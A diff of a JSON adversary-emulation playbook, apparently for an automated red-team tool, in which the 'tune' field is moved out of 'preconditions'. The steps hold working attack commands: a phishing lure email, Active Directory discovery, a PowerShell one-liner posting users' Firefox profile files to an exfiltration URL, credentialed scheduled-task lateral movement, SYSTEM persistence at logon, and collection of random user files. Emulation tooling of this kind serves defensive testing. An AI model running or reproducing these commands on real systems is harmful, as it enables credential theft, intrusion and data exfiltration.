@@ -14,7 +14,8 @@
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -24,7 +25,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -34,7 +36,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -46,7 +49,8 @@
                 "exfiltration": "self.exfil",
                 "driveby": "self.driveby",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -54,7 +58,8 @@
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "InitialAccess",
@@ -65,10 +70,10 @@
                 "phishing": "self.phish_1",
                 "tool": "self.tool",
                 "driveby": "self.driveby",
-                "target": "self.target_1",
-                "tune": {
-                    "body": "Hi, \nThe 2019 Senior Staff Club House calendar gallery has been updated. To submit artwork for consideration, please fill in the form at http://${self.driveby_domain}/${self.payload_name}.\n The deadline for submission is May 17, 2019. \nThanks and look forward to seeing your beautiful projects! \nKelly"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "body": "Hi, \nThe 2019 Senior Staff Club House calendar gallery has been updated. To submit artwork for consideration, please fill in the form at http://${self.driveby_domain}/${self.payload_name}.\n The deadline for submission is May 17, 2019. \nThanks and look forward to seeing your beautiful projects! \nKelly"
             }
         },
         {
@@ -81,7 +86,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -93,7 +99,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -104,10 +111,10 @@
                 "phishing": "self.phish_1",
                 "tool": "self.tool",
                 "driveby": "self.driveby",
-                "target": "self.target_1",
-                "tune": {
-                    "infra": true
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "infra": true
             }
         },
         {
@@ -117,10 +124,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "systeminfo"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "systeminfo"
             }
         },
         {
@@ -130,10 +137,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net config workstation"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net config workstation"
             }
         },
         {
@@ -143,10 +150,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c dir"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c dir"
             }
         },
         {
@@ -156,10 +163,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "wmic cpu get caption, deviceid, name, numberofcores, maxclockspeed, status"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "wmic cpu get caption, deviceid, name, numberofcores, maxclockspeed, status"
             }
         },
         {
@@ -169,10 +176,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "driverquery -v"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "driverquery -v"
             }
         },
         {
@@ -182,10 +189,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "chkdsk"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "chkdsk"
             }
         },
         {
@@ -195,10 +202,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c set"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c set"
             }
         },
         {
@@ -208,10 +215,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c ver"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c ver"
             }
         },
         {
@@ -221,10 +228,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "route print"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "route print"
             }
         },
         {
@@ -234,10 +241,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "tasklist -v"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "tasklist -v"
             }
         },
         {
@@ -247,10 +254,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "ipconfig /all"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "ipconfig /all"
             }
         },
         {
@@ -260,10 +267,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c path"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c path"
             }
         },
         {
@@ -273,10 +280,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "ipconfig /all"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "ipconfig /all"
             }
         },
         {
@@ -286,10 +293,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "netsh advfirewall show allprofiles"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "netsh advfirewall show allprofiles"
             }
         },
         {
@@ -299,10 +306,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "netstat -ano"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "netstat -ano"
             }
         },
         {
@@ -312,10 +319,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net localgroup administrators"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net localgroup administrators"
             }
         },
         {
@@ -325,10 +332,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net user"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net user"
             }
         },
         {
@@ -338,10 +345,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "whoami /all /fo list"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "whoami /all /fo list"
             }
         },
         {
@@ -351,10 +358,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net view /all"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net view /all"
             }
         },
         {
@@ -364,10 +371,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net view /all /domain"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net view /all /domain"
             }
         },
         {
@@ -377,10 +384,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net user /domain"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net user /domain"
             }
         },
         {
@@ -390,10 +397,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell net groups 'Domain Computers' /domain"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell net groups 'Domain Computers' /domain"
             }
         },
         {
@@ -403,10 +410,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell net groups 'Domain Controllers' /domain"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell net groups 'Domain Controllers' /domain"
             }
         },
         {
@@ -416,10 +423,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell net groups 'Domain Admins' /domain"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell net groups 'Domain Admins' /domain"
             }
         },
         {
@@ -429,10 +436,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "netstat -ano"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "netstat -ano"
             }
         },
         {
@@ -445,7 +452,8 @@
                 "tool": "self.tool",
                 "target_1": "self.target_1",
                 "target_2": "self.target_1_elevated"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -456,7 +464,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1_elevated"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Exfiltration",
@@ -466,10 +475,10 @@
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
                 "target": "self.target_1_elevated",
-                "exfil": "self.exfil",
-                "tune": {
-                    "command": "powershell &{dir c:\\users | foreach -Process {$user = $_.name;dir c:\\users\\$user\\appdata\\roaming\\mozilla\\firefox\\profiles\\*\\* | foreach -Process {$file = $_.fullname; Invoke-RestMethod -Uri {self.exfil_url} -Method Post -InFile $file}}; echo \"success!\"}"
-                }
+                "exfil": "self.exfil"
+            },
+            "tune": {
+                "command": "powershell &{dir c:\\users | foreach -Process {$user = $_.name;dir c:\\users\\$user\\appdata\\roaming\\mozilla\\firefox\\profiles\\*\\* | foreach -Process {$file = $_.fullname; Invoke-RestMethod -Uri {self.exfil_url} -Method Post -InFile $file}}; echo \"success!\"}"
             }
         },
         {
@@ -480,7 +489,8 @@
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
                 "target": "self.target_1_elevated"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Persistence",
@@ -490,7 +500,8 @@
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
                 "target": "self.target_1_elevated"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "LateralMovement",
@@ -500,10 +511,10 @@
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
                 "target_1": "self.target_1_elevated",
-                "target_2": "self.target_1_elevated",
-                "tune": {
-                    "command": "robocopy c:\\users\\public\\ \\\\file\\share${self.payload_name}"
-                }
+                "target_2": "self.target_1_elevated"
+            },
+            "tune": {
+                "command": "robocopy c:\\users\\public\\ \\\\file\\share${self.payload_name}"
             }
         },
         {
@@ -514,10 +525,10 @@
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
                 "target_1": "self.target_1_elevated",
-                "target_2": "self.target_2",
-                "tune": {
-                    "command": "powershell &{schtasks /create /f /tn \"${self.target_2_taskname}\" /s${self.target_2_hostname}/u${self.target_2_username}@${self.domain}/p${self.target_2_password}/ST 23:58 /sc once /tr cmd.exe /ru${self.target_2_username}@${self.domain}/rp${self.target_2_password}; $password = ConvertTo-SecureString '${self.target_2_password}' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential ('${self.target_2_username}@${self.domain}', $password); $opt = New-CimSessionOption -protocol DCOM; $cim = New-CimSession -ComputerName${self.target_2_hostname}-Credential $credential -SessionOption $opt; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\file\\share /user:${self.target_2_username}@${self.domain}${self.target_2_password}\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"\\\\file\\share c:\\users\\administrator\\appdata\\local\\temp${self.payload_name}\"; $trigger = New-ScheduledTaskTrigger -once -at 23:59; Set-ScheduledTask -cimsession $cim -action $action1,$action2 -trigger $trigger -taskname \"${self.target_2_taskname}\" -user${self.target_2_username}@${self.domain}-password${self.target_2_password}}"
-                }
+                "target_2": "self.target_2"
+            },
+            "tune": {
+                "command": "powershell &{schtasks /create /f /tn \"${self.target_2_taskname}\" /s${self.target_2_hostname}/u${self.target_2_username}@${self.domain}/p${self.target_2_password}/ST 23:58 /sc once /tr cmd.exe /ru${self.target_2_username}@${self.domain}/rp${self.target_2_password}; $password = ConvertTo-SecureString '${self.target_2_password}' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential ('${self.target_2_username}@${self.domain}', $password); $opt = New-CimSessionOption -protocol DCOM; $cim = New-CimSession -ComputerName${self.target_2_hostname}-Credential $credential -SessionOption $opt; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\file\\share /user:${self.target_2_username}@${self.domain}${self.target_2_password}\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"\\\\file\\share c:\\users\\administrator\\appdata\\local\\temp${self.payload_name}\"; $trigger = New-ScheduledTaskTrigger -once -at 23:59; Set-ScheduledTask -cimsession $cim -action $action1,$action2 -trigger $trigger -taskname \"${self.target_2_taskname}\" -user${self.target_2_username}@${self.domain}-password${self.target_2_password}}"
             }
         },
         {
@@ -530,7 +541,8 @@
                 "tool": "self.tool",
                 "target_1": "self.target_1_elevated",
                 "target_2": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "LateralMovement",
@@ -540,10 +552,10 @@
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
                 "target_1": "self.target_1_elevated",
-                "target_2": "self.target_2",
-                "tune": {
-                    "command": "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN${self.target_2_taskname}/TR c:\\users\\administrator\\appdata\\local\\temp\\${self.payload_name}/RL highest /u${self.target_2_username}@${self.domain}/p${self.target_2_password}/ru${self.target_2_username}@${self.domain}/rp${self.target_2_password}/s${self.target_2_hostname}"
-                }
+                "target_2": "self.target_2"
+            },
+            "tune": {
+                "command": "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN${self.target_2_taskname}/TR c:\\users\\administrator\\appdata\\local\\temp\\${self.payload_name}/RL highest /u${self.target_2_username}@${self.domain}/p${self.target_2_password}/ru${self.target_2_username}@${self.domain}/rp${self.target_2_password}/s${self.target_2_hostname}"
             }
         },
         {
@@ -556,7 +568,8 @@
                 "tool": "self.tool",
                 "target_1": "self.target_1_elevated",
                 "target_2": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -567,7 +580,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Collection",
@@ -576,10 +590,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
-                "target": "self.target_2",
-                "tune": {
-                    "command": "cmd /c copy c:\\users\\administrator\\appdata\\local\\temp\\${self.payload_name}C:\\Windows\\SysWow64\\atasagent.exe"
-                }
+                "target": "self.target_2"
+            },
+            "tune": {
+                "command": "cmd /c copy c:\\users\\administrator\\appdata\\local\\temp\\${self.payload_name}C:\\Windows\\SysWow64\\atasagent.exe"
             }
         },
         {
@@ -590,10 +604,10 @@
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
                 "target_1": "self.target_2",
-                "target_2": "self.target_2",
-                "tune": {
-                    "command": "powershell &{$taskname = New-Guid; $taskname = $taskname.guid.toUpper(); $action = New-ScheduledTaskAction -Execute '${self.target_2_persist_location}'; $trigger =  New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -Action $action -Trigger $trigger -TaskName \"{$taskname}\" -User \"System\" -force}"
-                }
+                "target_2": "self.target_2"
+            },
+            "tune": {
+                "command": "powershell &{$taskname = New-Guid; $taskname = $taskname.guid.toUpper(); $action = New-ScheduledTaskAction -Execute '${self.target_2_persist_location}'; $trigger =  New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -Action $action -Trigger $trigger -TaskName \"{$taskname}\" -User \"System\" -force}"
             }
         },
         {
@@ -603,10 +617,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
-                "target": "self.target_2",
-                "tune": {
-                    "command": "powershell &{$files = @(); gci c:\\\\users -exclude \"Public\" | gci -Recurse -exclude \"AppData,\",\"*.lnk\",\"*.url\" -file 2>$null | foreach {$files = $files + $_.FullName};$file = $files | Get-Random; Copy-Item -Path $file C:\\Windows\\SysWow64\\secret1.file -force; echo $file}"
-                }
+                "target": "self.target_2"
+            },
+            "tune": {
+                "command": "powershell &{$files = @(); gci c:\\\\users -exclude \"Public\" | gci -Recurse -exclude \"AppData,\",\"*.lnk\",\"*.url\" -file 2>$null | foreach {$files = $files + $_.FullName};$file = $files | Get-Random; Copy-Item -Path $file C:\\Windows\\SysWow64\\secret1.file -force; echo $file}"
             }
         },
         {
@@ -616,10 +630,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
-                "target": "self.target_2",
-                "tune": {
-                    "command": "powershell &{$files = @(); gci c:\\\\users -exclude \"Public\" | gci -Recurse -exclude \"AppData,\",\"*.lnk\",\"*.url\" -file 2>$null | foreach {$files = $files + $_.FullName};$file = $files | Get-Random; Copy-Item -Path $file C:\\Windows\\SysWow64\\secret2.file -force; echo $file}"
-                }
+                "target": "self.target_2"
+            },
+            "tune": {
+                "command": "powershell &{$files = @(); gci c:\\\\users -exclude \"Public\" | gci -Recurse -exclude \"AppData,\",\"*.lnk\",\"*.url\" -file 2>$null | foreach {$files = $files + $_.FullName};$file = $files | Get-Random; Copy-Item -Path $file C:\\Windows\\SysWow64\\secret2.file -force; echo $file}"
             }
         },
         {
@@ -631,7 +645,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "target": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Exfiltration",
@@ -642,7 +657,8 @@
                 "tool": "self.tool",
                 "target": "self.target_2",
                 "exfil": "self.exfil"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "DefenseEvasion",
@@ -653,7 +669,8 @@
                 "tool": "self.tool",
                 "target_1": "self.target_1_elevated",
                 "target_2": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Utility",
@@ -663,7 +680,8 @@
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
                 "target": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Utility",
@@ -673,7 +691,8 @@
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
                 "target": "self.target_1_elevated"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Utility",
@@ -683,7 +702,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         }
     ],
     "iocs": {
